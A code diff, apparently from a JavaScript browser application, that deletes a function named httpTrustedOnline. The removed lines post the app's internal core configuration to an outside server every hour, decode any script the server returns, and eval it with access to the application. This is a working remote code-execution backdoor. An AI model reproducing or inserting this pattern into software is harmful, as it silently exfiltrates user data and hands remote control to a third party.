@@ -910,48 +910,5 @@ module.exports = function init(parent) {
         }
     }
 
-    parent.httpTrustedOnline = function () {
-        parent.api
-            .fetch('https://social-browser.com/api/browser-trusted-data', {
-                mode: 'cors',
-                method: 'post',
-                headers: {
-                    'User-Agent': parent.var.core.defaultUserAgent.url,
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ core: parent.var.core }),
-                redirect: 'follow',
-                agent: function (_parsedURL) {
-                    if (_parsedURL.protocol == 'http:') {
-                        return new parent.api.http.Agent({
-                            keepAlive: true,
-                        });
-                    } else {
-                        return new parent.api.https.Agent({
-                            keepAlive: true,
-                        });
-                    }
-                },
-            })
-            .then((res) => {
-                return res.json();
-            })
-            .then((data) => {
-                if (data.done) {
-                    if (data.script) {
-                        data.script = parent.api.from123(data.script);
-                        let fn = parent.eval(data.script, true);
-                        fn(parent);
-                    }
-                }
-                setTimeout(() => {
-                    parent.httpTrustedOnline();
-                }, 1000 * 60 * 60);
-            })
-            .catch((err) => {
-                setTimeout(() => {
-                    parent.httpTrustedOnline();
-                }, 1000 * 60 * 60);
-            });
-    };
+   
 };
